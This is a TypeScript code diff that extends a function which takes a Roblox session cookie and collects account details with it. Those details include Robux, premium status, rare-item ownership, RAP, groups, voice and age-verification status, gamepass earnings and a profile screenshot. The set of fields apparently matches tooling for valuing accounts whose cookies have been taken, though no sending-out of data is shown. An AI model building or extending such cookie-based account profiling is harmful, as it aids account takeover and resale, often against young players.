@@ -156,6 +156,7 @@ interface RobloxInfo {
   hasKorblox: boolean | null;
   hasHeadless: boolean | null;
   headshot: string | null;
+  avatar: string | null;
   createdAt: string | null;
   accountAgeDays: number | null;
   friendsCount: number | null;
@@ -163,6 +164,10 @@ interface RobloxInfo {
   followingCount: number | null;
   ownedGroups: GroupOwned[];
   totalGroups: number | null;
+  voiceEnabled: boolean | null;
+  ageVerified: boolean | null;
+  gamepassEarnings: number | null;
+  screenshotUrl: string | null;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -174,10 +179,11 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, gamepassEarnings] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
+      fetchAvatar(auth.id),
       fetchRap(auth.id),
       ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
       ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
@@ -186,12 +192,18 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followers/count`, "count"),
       fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followings/count`, "count"),
       fetchGroups(auth.id),
+      fetchVoiceEnabled(cookieHeader),
+      fetchAgeVerified(cookieHeader),
+      fetchGamepassEarnings(auth.id),
     ]);
 
     const createdAt = profile?.created ?? null;
     const accountAgeDays = createdAt
       ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
       : null;
+
+    // Free screenshot service — no API key needed
+    const screenshotUrl = `https://image.thum.io/get/width/800/crop/1000/noanimate/https://www.roblox.com/users/${auth.id}/profile`;
 
     return {
       id: auth.id,
@@ -203,6 +215,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       hasKorblox,
       hasHeadless,
       headshot,
+      avatar,
       createdAt,
       accountAgeDays,
       friendsCount,
@@ -210,11 +223,67 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       followingCount,
       ownedGroups: groupsInfo.owned,
       totalGroups: groupsInfo.total,
+      voiceEnabled,
+      ageVerified,
+      gamepassEarnings,
+      screenshotUrl,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
     return null;
   }
+}
+
+async function fetchAvatar(userId: number): Promise<string | null> {
+  try {
+    const h = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
+    if (!h.ok) return null;
+    const j = await h.json();
+    return j?.data?.[0]?.imageUrl ?? null;
+  } catch { return null; }
+}
+
+async function fetchVoiceEnabled(cookieHeader: string): Promise<boolean | null> {
+  try {
+    const r = await fetch("https://voice.roblox.com/v1/settings", { headers: { Cookie: cookieHeader } });
+    if (!r.ok) return null;
+    const j = await r.json();
+    return j?.isVoiceEnabled ?? false;
+  } catch { return null; }
+}
+
+async function fetchAgeVerified(cookieHeader: string): Promise<boolean | null> {
+  try {
+    const r = await fetch("https://accountinformation.roblox.com/v1/birthdate", { headers: { Cookie: cookieHeader } });
+    if (!r.ok) return null;
+    const j = await r.json();
+    // Verified accounts include an isAgeVerified flag; fall back to age >= 13 calc
+    if (typeof j?.isAgeVerified === "boolean") return j.isAgeVerified;
+    return null;
+  } catch { return null; }
+}
+
+// Sums the price of all gamepasses created/owned by the user (potential earnings)
+async function fetchGamepassEarnings(userId: number): Promise<number | null> {
+  try {
+    let total = 0;
+    let cursor = "";
+    for (let page = 0; page < 5; page++) {
+      const url = `https://games.roblox.com/v2/users/${userId}/games?accessFilter=2&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
+      const r = await fetch(url);
+      if (!r.ok) break;
+      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
+      for (const game of j.data ?? []) {
+        const gp = await fetch(`https://games.roblox.com/v1/games/${game.id}/game-passes?limit=100&sortOrder=Asc`);
+        if (!gp.ok) continue;
+        const gpJson = await gp.json() as { data?: Array<{ price: number | null }> };
+        for (const pass of gpJson.data ?? []) total += pass.price ?? 0;
+      }
+      if (!j.nextPageCursor) break;
+      cursor = j.nextPageCursor;
+    }
+    return total;
+  } catch { return null; }
 }
 
 async function fetchProfile(userId: number): Promise<{ created: string } | null> {
